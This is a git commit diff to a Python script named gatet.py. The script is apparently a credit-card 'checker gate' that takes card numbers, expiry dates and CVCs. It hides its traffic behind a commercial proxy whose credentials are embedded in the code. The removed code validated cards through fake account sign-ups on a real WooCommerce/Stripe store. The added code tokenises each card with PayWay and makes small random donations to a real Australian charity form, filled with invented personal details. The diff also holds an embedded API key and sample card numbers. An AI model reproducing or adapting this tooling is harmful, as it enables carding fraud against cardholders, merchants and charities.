4017c13af158929346cd25485c3df596027f37e9
lightyagami210618 <genpaypal03@gmail.com>
2026-06-30 08:51:03 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -2,9 +2,13 @@ import random
 import string
 import requests
 from user_agent import generate_user_agent
-#from proxy import reqproxy, make_request
+from proxy import reqproxy, make_request
 import json
 import re
+import base64
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
+from urllib.parse import urlparse, urlencode, parse_qs
 
 #============================================
 def generate_full_name():
@@ -34,11 +38,10 @@ def generate_random_code(length=32):
 
 #============================================
 def Tele(ccx):
-    #proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
-    #session, ip = reqproxy(proxy_str)
+    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_814755ba-zone-datacenter_proxy1:quvlkui5tk88"
+    session, ip = reqproxy(proxy_str)
     #print(f"IP Address: {ip}")
-    session = requests.Session()
-    ccx=ccx.strip()
+    ccx = ccx.strip()
     numbers = re.findall(r"\d+", ccx)
     n = mm = yy = cvc = ""
     if len(numbers) >= 4:
@@ -46,10 +49,9 @@ def Tele(ccx):
         mm = numbers[1]
         yy = numbers[2]
         cvc = numbers[3]
-        mm = str(int(mm))
+        #mm = str(int(mm))
         if len(yy) == 4:
             yy = yy[-2:]
-
 
     user = generate_user_agent()
     r = requests.Session()
@@ -64,81 +66,82 @@ def Tele(ccx):
     sess = generate_random_code()
     nr = random.randint(100000, 999999)
     lr = random.randint(1000, 9999)
-
-    headers = {
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-    }
-    
-    response = session.get('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers)
-    
-    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-    print(register)
+    fr = random.randint(11, 99)
+    br = random.randint(1, 4)
+    username = ''.join(random.choices(string.ascii_lowercase, k=8))
     
     headers = {
-        'content-type': 'application/x-www-form-urlencoded',
-        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
-    data = {
-        'email': f'rodamuser{nr}@gmail.com',
-        'wc_order_attribution_source_type': 'typein',
-        'wc_order_attribution_referrer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
-        'wc_order_attribution_utm_campaign': '(none)',
-        'wc_order_attribution_utm_source': '(direct)',
-        'wc_order_attribution_utm_medium': '(none)',
-        'wc_order_attribution_utm_content': '(none)',
-        'wc_order_attribution_utm_id': '(none)',
-        'wc_order_attribution_utm_term': '(none)',
-        'wc_order_attribution_utm_source_platform': '(none)',
-        'wc_order_attribution_utm_creative_format': '(none)',
-        'wc_order_attribution_utm_marketing_tactic': '(none)',
-        'wc_order_attribution_session_entry': 'https://hendrahabits.com.au/my-account/add-payment-method/',
-        'wc_order_attribution_session_start_time': '2026-05-09 16:34:24',
-        'wc_order_attribution_session_pages': '1',
-        'wc_order_attribution_session_count': '1',
-        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        'woocommerce-register-nonce': f'{register}',
-        '_wp_http_referer': '/my-account/add-payment-method/',
-        'register': 'Register',
-    }
-    
-    response = session.post('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers, data=data)
-    
-    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
-    print(ajax)
-    
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=AU&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhendrahabits.com.au&time_on_page=105109&guid=NA&muid=NA&sid=NA&key=pk_live_51Lv72tBTsguVbm1C8raLSY7GRZM7Ag7jHFBLzEBOtYP3lg53GRev8R3CZjJmv4la6iKCOn1UbOPgDvTbnb7GOaBB00QzUJtLnx'
-    
-    response = session.post('https://api.stripe.com/v1/payment_methods', data=data)
-    
-    pm = response.json()['id']
-    print(pm)
-    
-    headers = {
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-    }
-    
-    data = {
-        'action': 'wc_stripe_create_and_confirm_setup_intent',
-        'wc-stripe-payment-method': f'{pm}',
-        'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': f'{ajax}',
-    }
-    
-    response = session.post('https://hendrahabits.com.au/wp-admin/admin-ajax.php',
+    response = session.get('https://tsanz.com.au/donations/donationform.htm',
     headers=headers,
+    timeout=30,
+    )
+    
+    token = re.search(r'name="_token" value="(.*?)"', response.text).group(1)
+    print(token)
+    
+    headers = {
+        'authorization': 'Basic UTE0MTUyX1BVQl9qcTlneHZ5NGo1NzRodmQ3aDlzYXhqbXd5eHkzdGN3bnZlNXIyMnhleDdlazYzM2Z2N3AzeG1uenMyMmY6',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'user-agent': user,
+    }
+    
+    data = {
+        'paymentMethod': 'creditCard',
+        'connectionType': 'FRAME',
+        'cardNumber': f'{n}',
+        'cvn': f'{cvc}',
+        'cardholderName': f'{first_name} {last_name}',
+        'expiryDateMonth': f'{mm}',
+        'expiryDateYear': f'{yy}',
+        'threeDS2': 'false',
+    }
+    
+    response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, 
     data=data,
-)
-
+    timeout=30,
+    )
+    id = response.json()['singleUseTokenId']
+    print(id)
+    
+    headers = {
+        'referer': 'https://tsanz.com.au/donations/donationform.htm',
+        'user-agent': user,
+    }
+    
+    files = [
+        ('_token', (None, f'{token}')),
+        ('email', (None, f'rodamuser{nr}@gmail.com')),
+        ('title', (None, '')),
+        ('first_name', (None, f'{first_name}')),
+        ('last_name', (None, f'{last_name}')),
+        ('phone', (None, f'430300{lr}')),
+        ('address1', (None, '27 Allen St')),
+        ('address2', (None, '')),
+        ('suburb', (None, 'New York')),
+        ('postcode', (None, '10080')),
+        ('country_id', (None, '167')),
+        ('state_id', (None, '93')),
+        ('company', (None, '')),
+        ('donation_amount', (None, 'other')),
+        ('other_donation', (None, f'{fr}.{br}')),
+        ('_token', (None, f'{token}')),
+        ('singleUseTokenId', (None, f'{id}')),
+    ]
+    
+    response = session.post('https://tsanz.com.au/my-account/donation',
+    headers=headers,
+    files=files,
+    timeout=30,
+    )
+    
     try:
-        result = re.search(r'"message":"(.*?)"', response.text).group(1)
+        result = re.search(r'<div class="toast-body">\s*(.*?)\s*<\/div>', response.text).group(1)
     except:
-        result = re.search(r'"status":"(.*?)"', response.text).group(1)
-
+        result = "Error While Processing.."
     return result
     
-#test_card = "5196032164892776|01|28|618"
+#test_card = "5311024271771951|09|2034|218"
 #print(Tele(test_card))
